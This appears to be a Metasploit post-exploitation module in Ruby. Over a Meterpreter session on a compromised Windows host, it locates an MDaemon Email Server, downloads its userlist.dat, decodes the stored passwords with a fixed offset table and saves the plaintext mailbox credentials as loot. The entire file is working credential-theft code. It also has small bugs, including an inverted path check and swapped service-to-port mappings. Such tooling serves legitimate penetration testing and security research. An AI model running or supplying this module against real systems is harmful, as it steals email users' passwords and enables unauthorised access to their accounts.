##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'base64'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  Rank = ExcellentRanking
  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'Windows Gather MDaemonEmailServer Credential Cracking',
        'Description'   => 'Finds and cracks the stored passwords of MDaemon Email Server',
        'References'    =>
        [
          ['BID', '4686']
        ],
        'License'       => MSF_LICENSE,
        'Author'        => ['Manuel Nader #AgoraSecurity'],
        'Platform'      => ['win'],
        'Arch'          => [ARCH_X86, ARCH_X64],
        'SessionTypes'  => ['meterpreter']
      )
    )

    register_options(
      [
        # If software is installed on a rare directory
        OptString.new('RPATH', [false, 'Path of the MDaemon installation', false])
      ]
    )
  end

  def run
    if session.type != 'meterpreter'
      print_error('Only meterpreter sessions are supported by this post module')
      return
    end

    progfiles_env = session.sys.config.getenvs('SYSTEMDRIVE', 'HOMEDRIVE', 'ProgramFiles', 'ProgramFiles(x86)', 'ProgramW6432')
    locations = ['C:\MDaemon\App']
    progfiles_env.each do |_k, v|
      vprint_status("Searching MDaemon installation at #{v}")
      if session.fs.dir.entries(v).include? 'MDaemon'
        vprint_status("Found MDaemon installation at #{v}")
        locations << v + '\\MDaemon\\'
      end
    end

    keys = [
      'HKLM\\SOFTWARE\\Alt-N Technologies\\MDaemon', # 64 bit. Has AppPath
    ]

    locations << datastore['RPATH'] if datastore['RPATH'].nil?

    keys.each do |key|
      begin
        root_key, base_key = session.sys.registry.splitkey(key)
        value = session.sys.registry.query_value_direct(root_key, base_key, 'AppPath')
      rescue Rex::Post::Meterpreter::RequestError => e
        vprint_error(e.message)
        next
      end
      locations << value.data + '\\'
    end
    locations.uniq!
    locations = locations.compact
    userlist = check_mdaemons(locations)
    get_mdaemon_creds(userlist) if userlist
  end

  def crack_password(raw_password)
    vprint_status("Cracking #{raw_password}")
    offset = [84, 104, 101, 32, 115, 101, 116, 117, 112, 32, 112, 114, 111, 99, 101]
    decode = Base64.decode64(raw_password).bytes
    crack = decode
    result = ''
    (0..(crack.size - 1)).each do |i|
      if (crack[i] - offset[i]) > 0
        result << (crack[i] - offset[i])
      else
        result << ((crack[i] - offset[i]) + 128)
      end
    end
    vprint_status("Password #{result}")
    result
  end

  def check_mdaemons(locations)
    tmp_filename = (0...12).map { (65 + rand(26)).chr }.join
    begin
      locations.each do |location|
        vprint_status("Checking for Userlist in MDaemons directory at: #{location}")
        begin
          session.fs.dir.foreach(location.to_s) do |fdir|
            ['userlist.dat'].each do |datfile|
              next if fdir.casecmp(datfile) != 0

              filepath = location + '\\' + datfile
              print_good("Configuration file found: #{filepath}")
              print_good("Found MDaemons on #{sysinfo['Computer']} via session ID: #{session.sid}")
              vprint_status("Downloading UserList.dat file to tmp file: #{tmp_filename}")
              session.fs.file.download_file(tmp_filename, filepath)
              # userdat = session.fs.file.open(filepath).read.to_s.split(/\n/)
              return tmp_filename
            end
          end
        rescue Rex::Post::Meterpreter::RequestError => e
          vprint_error(e.message)
        end
      end
    rescue StandardError => e
      print_error(e.to_s)
      return
    end

    nil
  end

  def parse_userlist(data)
    # creds  = ["['domain','mailbox','full_name','mail_dir','password']"]
    creds = []
    pop3 = []
    imap = []
    users = 0
    passwords = 0
    file = File.open(data)
    file.each do |line|
      domain = line.slice(0..44).strip!
      mailbox = line.slice(45..74).strip!
      full_name = line.slice(75..104).strip!
      mail_dir = line.slice(105..194).strip!
      raw_password = line.slice(195..210)
      password = crack_password(raw_password)
      access = line.slice(217)
      users += 1
      passwords += 1
      if access == 'Y' # IMAP & POP3
        pop3 << [domain, mailbox, full_name, mail_dir, password]
        imap << [domain, mailbox, full_name, mail_dir, password]
      elsif access == 'P' # POP3
        pop3 << [domain, mailbox, full_name, mail_dir, password]
      elsif access == 'I' # IMAP
        imap << [domain, mailbox, full_name, mail_dir, password]
      end
      # Saves all the passwords
      creds << [domain, mailbox, full_name, mail_dir, password]
    end
    vprint_status('Collected the following credentials:')
    vprint_status("    Usernames: #{users}")
    vprint_status("    Passwords: #{passwords}")
    vprint_status("Deleting tmp file: #{data}")
    del_cmd = 'rm '
    del_cmd << data
    system(del_cmd)
    [creds, imap, pop3]
  end

  def report_mdaemon_cred(creds, port: 0, service: nil)
    # Build service information
    service_data = {
      # address: session.session_host, # Gives internal IP
      address: session.tunnel_peer.partition(':')[0], # Gives public IP
      port: port,
      service_name: 'smtp',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }
    # Iterate through credentials
    creds.each do |cred|
      # Build credential information
      credential_data = {
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: refname,
        private_type: :password,
        private_data: cred[4],
        username: cred[1],
        module_fullname: fullname
      }
      credential_data.merge!(service_data)
      credential_core = create_credential(credential_data)

      # Assemble the options hash for creating the Metasploit::Credential::Login object
      login_data = {
        core: credential_core,
        status: Metasploit::Model::Login::Status::UNTRIED,
        workspace_id: myworkspace_id
      }

      login_data.merge!(service_data)
      create_credential_login(login_data)

      print_status("    Extracted: #{credential_data[:username]}:#{credential_data[:private_data]}")
    end

    # report the goods!
    loot_path = store_loot(
      'MDaemon.smtp_server.creds',
      'text/csv',
      session,
      creds.to_csv,
      "mdaemon_#{service}_server_credentials.csv",
      "MDaemon #{service.upcase} Users Credentials"
    )
    print_status("#{service.upcase} credentials saved in: #{loot_path}")
  end

  def get_mdaemon_creds(userlist)
    (smtp, imap, pop3) = parse_userlist(userlist)
    report_mdaemon_cred(smtp, port: 25, service: 'smtp')
    report_mdaemon_cred(imap, port: 110, service: 'pop3')
    report_mdaemon_cred(pop3, port: 143, service: 'imap')
  end
end
